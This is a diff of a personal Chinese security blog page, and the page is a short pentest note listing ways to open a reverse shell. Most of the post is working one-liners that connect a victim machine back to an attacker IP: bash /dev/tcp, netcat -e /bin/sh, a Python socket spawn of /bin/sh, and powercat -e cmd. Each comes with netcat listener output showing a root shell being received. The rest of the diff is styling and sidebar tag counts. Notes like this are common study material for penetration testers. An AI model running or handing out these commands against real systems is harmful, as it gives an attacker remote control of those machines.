@@ -86,86 +86,79 @@
             <div class="post-content"> 
             <p>记录：关于bash shell的反弹:)随笔记<br />
 假定环境：</p>
+
 <ul>
-  <li>
-    <table>
-      <tbody>
-        <tr>
-          <td>kali被攻击机器；ip:192.168.3.32</td>
-          <td>iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.92</td>
-        </tr>
-      </tbody>
-    </table>
-  </li>
+  <li>kali被攻击机器；ip:192.168.3.32</li>
+  <li>iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.92</li>
 </ul>
 
 <h2 id="1bash">1.bash</h2>
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">bash</span> <span class="o">-</span><span class="nx">i</span> <span class="o">&gt;&amp;</span><span class="sr">/dev/</span><span class="nx">tcp</span><span class="o">/</span><span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span><span class="o">/</span><span class="mi">1234</span> <span class="mi">0</span><span class="o">&gt;&amp;</span> <span class="mi">1</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/# bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp;/dev/tcp/47.52.233.92/1234 0&gt;&amp; 1
 </code></pre></div></div>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">1234</span>
-<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1234</span><span class="p">)</span>
-<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">223.240</span><span class="p">.</span><span class="mf">212.236</span> <span class="mi">37798</span> <span class="nx">received</span><span class="o">!</span>
-<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">whoami</span> 
-<span class="nx">whoami</span>
-<span class="nx">root</span>
-<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">ifconfig</span>    
-<span class="nx">ifconfig</span>
-<span class="nx">eth0</span><span class="p">:</span> <span class="nx">flags</span><span class="o">=</span><span class="mi">4099</span><span class="o">&lt;</span><span class="nx">UP</span><span class="p">,</span><span class="nx">BROADCAST</span><span class="p">,</span><span class="nx">MULTICAST</span><span class="o">&gt;</span>  <span class="nx">mtu</span> <span class="mi">1500</span>
-        <span class="nx">ether</span> <span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="nx">e5</span><span class="p">:</span><span class="nx">d0</span><span class="p">:</span><span class="mi">0</span><span class="nx">d</span>  <span class="nx">txqueuelen</span> <span class="mi">1000</span>  <span class="p">(</span><span class="nx">Ethernet</span><span class="p">)</span>
-        <span class="nx">RX</span> <span class="nx">packets</span> <span class="mi">0</span>  <span class="nx">bytes</span> <span class="mi">0</span> <span class="p">(</span><span class="mf">0.0</span> <span class="nx">B</span><span class="p">)</span>
-        <span class="nx">RX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span>  <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">frame</span> <span class="mi">0</span>
-        <span class="nx">TX</span> <span class="nx">packets</span> <span class="mi">0</span>  <span class="nx">bytes</span> <span class="mi">0</span> <span class="p">(</span><span class="mf">0.0</span> <span class="nx">B</span><span class="p">)</span>
-        <span class="nx">TX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span> <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">carrier</span> <span class="mi">0</span>  <span class="nx">collisions</span> <span class="mi">0</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@iZj6cgn7odv59wmjjhe6zwZ:~# nc <span class="nt">-lvvp</span> 1234
+Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 1234<span class="o">)</span>
+Connection from 223.240.212.236 37798 received!
+root@kali:/# <span class="nb">whoami 
+whoami
+</span>root
+root@kali:/# ifconfig    
+ifconfig
+eth0: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 1c:39:47:e5:d0:0d  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-<span class="nx">lo</span><span class="p">:</span> <span class="nx">flags</span><span class="o">=</span><span class="mi">73</span><span class="o">&lt;</span><span class="nx">UP</span><span class="p">,</span><span class="nx">LOOPBACK</span><span class="p">,</span><span class="nx">RUNNING</span><span class="o">&gt;</span>  <span class="nx">mtu</span> <span class="mi">65536</span>
-        <span class="nx">inet</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span>  <span class="nx">netmask</span> <span class="mf">255.0</span><span class="p">.</span><span class="mf">0.0</span>
-        <span class="nx">inet6</span> <span class="p">::</span><span class="mi">1</span>  <span class="nx">prefixlen</span> <span class="mi">128</span>  <span class="nx">scopeid</span> <span class="mh">0x10</span><span class="o">&lt;</span><span class="nx">host</span><span class="o">&gt;</span>
-        <span class="nx">loop</span>  <span class="nx">txqueuelen</span> <span class="mi">1000</span>  <span class="p">(</span><span class="nx">Local</span> <span class="nx">Loopback</span><span class="p">)</span>
-        <span class="nx">RX</span> <span class="nx">packets</span> <span class="mi">132196</span>  <span class="nx">bytes</span> <span class="mi">121378334</span> <span class="p">(</span><span class="mf">115.7</span> <span class="nx">MiB</span><span class="p">)</span>
-        <span class="nx">RX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span>  <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">frame</span> <span class="mi">0</span>
-        <span class="nx">TX</span> <span class="nx">packets</span> <span class="mi">132196</span>  <span class="nx">bytes</span> <span class="mi">121378334</span> <span class="p">(</span><span class="mf">115.7</span> <span class="nx">MiB</span><span class="p">)</span>
-        <span class="nx">TX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span> <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">carrier</span> <span class="mi">0</span>  <span class="nx">collisions</span> <span class="mi">0</span>
+lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
+        RX packets 132196  bytes 121378334 <span class="o">(</span>115.7 MiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 132196  bytes 121378334 <span class="o">(</span>115.7 MiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-<span class="nx">wlan0</span><span class="p">:</span> <span class="nx">flags</span><span class="o">=</span><span class="mi">4163</span><span class="o">&lt;</span><span class="nx">UP</span><span class="p">,</span><span class="nx">BROADCAST</span><span class="p">,</span><span class="nx">RUNNING</span><span class="p">,</span><span class="nx">MULTICAST</span><span class="o">&gt;</span>  <span class="nx">mtu</span> <span class="mi">1500</span>
-        <span class="nx">inet</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.32</span>  <span class="nx">netmask</span> <span class="mf">255.255</span><span class="p">.</span><span class="mf">255.0</span>  <span class="nx">broadcast</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.255</span>
-        <span class="nx">inet6</span> <span class="nx">fe80</span><span class="p">::</span><span class="nx">c895</span><span class="p">:</span><span class="mi">5</span><span class="nx">ca5</span><span class="p">:</span><span class="mi">529</span><span class="nx">a</span><span class="p">:</span><span class="nx">eef3</span>  <span class="nx">prefixlen</span> <span class="mi">64</span>  <span class="nx">scopeid</span> <span class="mh">0x20</span><span class="o">&lt;</span><span class="nx">link</span><span class="o">&gt;</span>
-        <span class="nx">ether</span> <span class="mi">68</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="nx">d5</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">16</span>  <span class="nx">txqueuelen</span> <span class="mi">1000</span>  <span class="p">(</span><span class="nx">Ethernet</span><span class="p">)</span>
-        <span class="nx">RX</span> <span class="nx">packets</span> <span class="mi">140963</span>  <span class="nx">bytes</span> <span class="mi">101469044</span> <span class="p">(</span><span class="mf">96.7</span> <span class="nx">MiB</span><span class="p">)</span>
-        <span class="nx">RX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">15</span>  <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">frame</span> <span class="mi">0</span>
-        <span class="nx">TX</span> <span class="nx">packets</span> <span class="mi">86373</span>  <span class="nx">bytes</span> <span class="mi">16895892</span> <span class="p">(</span><span class="mf">16.1</span> <span class="nx">MiB</span><span class="p">)</span>
-        <span class="nx">TX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span> <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">carrier</span> <span class="mi">0</span>  <span class="nx">collisions</span> <span class="mi">0</span>
+wlan0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.3.32  netmask 255.255.255.0  broadcast 192.168.3.255
+        inet6 fe80::c895:5ca5:529a:eef3  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
+        ether 68:07:15:d5:46:16  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 140963  bytes 101469044 <span class="o">(</span>96.7 MiB<span class="o">)</span>
+        RX errors 0  dropped 15  overruns 0  frame 0
+        TX packets 86373  bytes 16895892 <span class="o">(</span>16.1 MiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 </code></pre></div></div>
 
 <h2 id="2netcat">2.netcat</h2>
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">sh</span> <span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span> <span class="mi">1234</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/# nc <span class="nt">-e</span> /bin/sh 47.52.233.92 1234
 </code></pre></div></div>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">1234</span>
-<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1234</span><span class="p">)</span>
-<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">223.240</span><span class="p">.</span><span class="mf">212.236</span> <span class="mi">37812</span> <span class="nx">received</span><span class="o">!</span>
-<span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty;pty.spawn("/bin/sh")</span><span class="dl">'</span>
-<span class="err">#</span> <span class="nx">whoami</span>
-<span class="nx">whoami</span>
-<span class="nx">root</span>
-<span class="err">#</span> 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@iZj6cgn7odv59wmjjhe6zwZ:~# nc <span class="nt">-lvvp</span> 1234
+Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 1234<span class="o">)</span>
+Connection from 223.240.212.236 37812 received!
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/sh")'</span>
+<span class="c"># whoami</span>
+<span class="nb">whoami
+</span>root
+<span class="c"># </span>
 </code></pre></div></div>
 
 <h2 id="3python">3.python</h2>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import socket,
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/# python <span class="nt">-c</span> <span class="s1">'import socket,
 subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("47.52.233.92",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
-os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span><span class="dl">'</span>
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 </code></pre></div></div>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">1234</span>
-<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1234</span><span class="p">)</span>
-<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">223.240</span><span class="p">.</span><span class="mf">212.236</span> <span class="mi">37820</span> <span class="nx">received</span><span class="o">!</span>
-<span class="err">#</span> <span class="nx">whoami</span>
-<span class="nx">root</span>
-<span class="err">#</span> <span class="nx">id</span>
-<span class="nx">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">组</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@iZj6cgn7odv59wmjjhe6zwZ:~# nc <span class="nt">-lvvp</span> 1234
+Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 1234<span class="o">)</span>
+Connection from 223.240.212.236 37820 received!
+<span class="c"># whoami</span>
+root
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> 组<span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </code></pre></div></div>
 
 <h2 id="4powershell构造函数反弹shell">4.powershell构造函数反弹shell</h2>
@@ -180,14 +173,27 @@ os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span><span class="dl
 powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 11223 <span class="nt">-e</span> cmd
 </code></pre></div></div>
 
-<p>meterpreter可以直接开启</p>
+<p><del>meterpreter可以直接开启</del></p>
 
-<p>run getui -e</p>
+<p><del>run getui -e</del></p>
 
-<p>然后用rdesktop就能直接连了</p>
+<p><del>然后用rdesktop就能直接连了</del></p>
 
             </div>
             <div class="spacing"></div>
+            <div>
+	<div class="hline"></div>
+	<h3><em>#</em> 申明</h3>
+	<div class="spacing"></div>
+	<h4><em>By: Bin4xin.</em></h4>
+	<h4>转载请申明本文链接：<a href="/blog/2019/shell/reserve/back/" target="_blank"> 「笔记」：反弹shell的几种方法</a></h4>
+
+	<h3><em># Any Questions</em></h3>
+	<div class="spacing"></div>
+	<h4> >_ 对本文进行提问：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://github.com/Bin4xin/bin4xin.github.io/blob/1b4fffa6232dc6ffa2cece8be0d6c39e0c5f9cfe/blog/2019/shell/reserve/back/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>
+
+	<h4> >_ 对本文进行留言：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://bin4xin.github.io/blog/2019/shell/reserve/back/" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
+</div>
         </div><!--/col-lg-8 -->
         
         <div class="col-lg-3">
@@ -203,9 +209,9 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
         <div class="post-meta mb-3">
           <i class="far fa-folder-open fa-fw mr-1"></i>
           
-            <a href='/blog/'>blog</a>/
-            <a href='/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/'>安全工具</a>/
-            <a href='/%E6%B8%97%E9%80%8F/'>渗透</a>/
+            <a href='/blog/'>blog</a>
+            <a href='/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/'>安全工具</a>
+            <a href='/%E6%B8%97%E9%80%8F/'>渗透</a>
             <a href='/%E7%AC%94%E8%AE%B0/'>笔记</a>
         </div>
         
@@ -219,27 +225,27 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
     
         <p>
             <i class="fa fa-angle-right"></i> 漏洞复现
-            <span class="badge badge-theme pull-right">14</span>
+            <span class="badge badge-theme pull-right">9</span>
         </p>
     
         <p>
             <i class="fa fa-angle-right"></i> 渗透
-            <span class="badge badge-theme pull-right">10</span>
+            <span class="badge badge-theme pull-right">8</span>
         </p>
     
         <p>
             <i class="fa fa-angle-right"></i> Vulnhub
-            <span class="badge badge-theme pull-right">10</span>
-        </p>
-    
-        <p>
-            <i class="fa fa-angle-right"></i> 安全工具
             <span class="badge badge-theme pull-right">6</span>
         </p>
     
         <p>
+            <i class="fa fa-angle-right"></i> 安全工具
+            <span class="badge badge-theme pull-right">5</span>
+        </p>
+    
+        <p>
             <i class="fa fa-angle-right"></i> 笔记
-            <span class="badge badge-theme pull-right">44</span>
+            <span class="badge badge-theme pull-right">33</span>
         </p>
     
         <p>
@@ -264,7 +270,7 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
     
         <p>
             <i class="fa fa-angle-right"></i> Android reverse
-            <span class="badge badge-theme pull-right">6</span>
+            <span class="badge badge-theme pull-right">4</span>
         </p>
     
         <p>
@@ -289,11 +295,6 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
     
         <p>
             <i class="fa fa-angle-right"></i> Python
-            <span class="badge badge-theme pull-right">2</span>
-        </p>
-    
-        <p>
-            <i class="fa fa-angle-right"></i> 机器学习
             <span class="badge badge-theme pull-right">1</span>
         </p>
     
@@ -309,12 +310,12 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
     
         <p>
             <i class="fa fa-angle-right"></i> Cve
-            <span class="badge badge-theme pull-right">9</span>
+            <span class="badge badge-theme pull-right">3</span>
         </p>
     
         <p>
             <i class="fa fa-angle-right"></i> Sql-inject
-            <span class="badge badge-theme pull-right">2</span>
+            <span class="badge badge-theme pull-right">1</span>
         </p>
     
         <p>
@@ -329,7 +330,7 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
     
         <p>
             <i class="fa fa-angle-right"></i> 信息搜集
-            <span class="badge badge-theme pull-right">8</span>
+            <span class="badge badge-theme pull-right">6</span>
         </p>
     
         <p>
@@ -338,13 +339,13 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
         </p>
     
         <p>
-            <i class="fa fa-angle-right"></i> Src
-            <span class="badge badge-theme pull-right">3</span>
+            <i class="fa fa-angle-right"></i> Vulnhub
+            <span class="badge badge-theme pull-right">1</span>
         </p>
     
         <p>
-            <i class="fa fa-angle-right"></i> Vulnhub
-            <span class="badge badge-theme pull-right">2</span>
+            <i class="fa fa-angle-right"></i> Src
+            <span class="badge badge-theme pull-right">1</span>
         </p>
     
         <p>
@@ -352,29 +353,24 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
             <span class="badge badge-theme pull-right">2</span>
         </p>
     
-        <p>
-            <i class="fa fa-angle-right"></i> Php
-            <span class="badge badge-theme pull-right">1</span>
-        </p>
-    
     </details>
     <div class="spacing"></div>
 
-    <h4>Popular Tags/热门标签</h4>
+    <h4>Tags/标签</h4>
     <div class="hline"></div>
     <p>
         
             <a class="btn btn-theme" href="" role="button">Web (12)</a>
         
-            <a class="btn btn-theme" href="" role="button">漏洞复现 (14)</a>
+            <a class="btn btn-theme" href="" role="button">漏洞复现 (9)</a>
         
-            <a class="btn btn-theme" href="" role="button">渗透 (10)</a>
+            <a class="btn btn-theme" href="" role="button">渗透 (8)</a>
         
-            <a class="btn btn-theme" href="" role="button">Vulnhub (10)</a>
+            <a class="btn btn-theme" href="" role="button">Vulnhub (6)</a>
         
-            <a class="btn btn-theme" href="" role="button">安全工具 (6)</a>
+            <a class="btn btn-theme" href="" role="button">安全工具 (5)</a>
         
-            <a class="btn btn-theme" href="" role="button">笔记 (44)</a>
+            <a class="btn btn-theme" href="" role="button">笔记 (33)</a>
         
             <a class="btn btn-theme" href="" role="button">软件移植 (2)</a>
         
@@ -384,7 +380,7 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
         
             <a class="btn btn-theme" href="" role="button">技巧 (3)</a>
         
-            <a class="btn btn-theme" href="" role="button">Android reverse (6)</a>
+            <a class="btn btn-theme" href="" role="button">Android reverse (4)</a>
         
             <a class="btn btn-theme" href="" role="button">排错 (3)</a>
         
@@ -394,39 +390,49 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
         
             <a class="btn btn-theme" href="" role="button">代码审计 (2)</a>
         
-            <a class="btn btn-theme" href="" role="button">Python (2)</a>
-        
-            <a class="btn btn-theme" href="" role="button">机器学习 (1)</a>
+            <a class="btn btn-theme" href="" role="button">Python (1)</a>
         
             <a class="btn btn-theme" href="" role="button">Terminal (1)</a>
         
             <a class="btn btn-theme" href="" role="button">Docker (3)</a>
         
-            <a class="btn btn-theme" href="" role="button">Cve (9)</a>
+            <a class="btn btn-theme" href="" role="button">Cve (3)</a>
         
-            <a class="btn btn-theme" href="" role="button">Sql-inject (2)</a>
+            <a class="btn btn-theme" href="" role="button">Sql-inject (1)</a>
         
             <a class="btn btn-theme" href="" role="button">Bash (2)</a>
         
             <a class="btn btn-theme" href="" role="button">内网 (1)</a>
         
-            <a class="btn btn-theme" href="" role="button">信息搜集 (8)</a>
+            <a class="btn btn-theme" href="" role="button">信息搜集 (6)</a>
         
             <a class="btn btn-theme" href="" role="button">Fuzz (1)</a>
         
-            <a class="btn btn-theme" href="" role="button">Src (3)</a>
+            <a class="btn btn-theme" href="" role="button">Vulnhub (1)</a>
         
-            <a class="btn btn-theme" href="" role="button">Vulnhub (2)</a>
+            <a class="btn btn-theme" href="" role="button">Src (1)</a>
         
             <a class="btn btn-theme" href="" role="button">Daily (2)</a>
         
-            <a class="btn btn-theme" href="" role="button">Php (1)</a>
-        
     </p>
+    <div class="spacing"></div>
+
+    <h4>Article Directory/文章目录</h4>
+    <div class="hline"></div>
+    <p>
+        <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#1bash">1.bash</a></li>
+<li class="toc-entry toc-h2"><a href="#2netcat">2.netcat</a></li>
+<li class="toc-entry toc-h2"><a href="#3python">3.python</a></li>
+<li class="toc-entry toc-h2"><a href="#4powershell构造函数反弹shell">4.powershell构造函数反弹shell</a></li>
+</ul>
+    </p>
+
 </div>
 
 
     </div><!--/row -->
+        
 </div><!--/container -->
 
 
@@ -437,13 +443,14 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
                 <p>本站由哨兵安全实验室支持创办</p>
                 <p class="thuhidden">个人感谢<em>@TUNA协会</em>的开源代码</p>
         <p class="thuhidden">Powered by <a href="https://github.com/Bin4xin">Bin4xin</a> &amp; <a title="open code from TUNA mirror-web." href="https://github.com/tuna/mirror-web"><em>这里是开源代码库</em></a>.</p>
-                <ul><li><a href="https://profile-counter.glitch.me/bin4xin.github.io/count.svg"> <em>∑ (Bin4xin's GitHub & bin4xin.github.io & SentrySec pages) (Visitor/time)</em> </a>
-                    <ul>
-                        <li>
-                            <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
-                        </li>
-                    </ul>
-                </li></ul>
+
+            <p class="share">
+                          <a href="https://github.com/Bin4xin/"><i class="fa fa-github"></i></a>
+                          <a href="#"><i class="fa fa-twitter"></i></a>
+                          <a href="#"><i class="fa fa-facebook"></i></a>
+                          <a href="#"><i class="fa fa-tumblr"></i></a>
+                          <a href="#"><i class="fa fa-google-plus"></i></a>    
+            </p>
 
             </div>
 
@@ -454,19 +461,17 @@ powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 1122
                       <li>
                       <a><i class="fa fa-envelope"></i> chihou.pro@gmail.com</a>
                       </li>
-                      <!-- <li>
-                      IRC: <a href="https://webchat.freenode.net/?channels=%23tuna">#tuna at freenode</a>
-                      </li> -->
-                      <li>
-                      <a href="https://github.com/Bin4xin/"><i class="fa fa-github"></i> GitHub </a>
-                      </li>
-                      <!-- <li>
-                      <a href="http://weibo.com/u/5402274706"><i class="fa fa-weibo"></i> 新浪微博</a>
-                      </li> -->
-
+                      </ul>
+                      <!-- <h6>SHARE:</h6> -->
+                      <ul><li><a href="https://profile-counter.glitch.me/bin4xin.github.io/count.svg"> <em>∑ <csmall>(Bin4xin's GitHub & bin4xin.github.io & SentrySec pages) (Visitor/time)</csmall></em> </a>
+                    <ul>
+                        <li>
+                            <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
+                        </li>
                     </ul>
+                </li></ul>
                   </div>
-                </div>
+            </div>
             <!-- aaa-->
             <div class="col-sm-4">
               <picture>
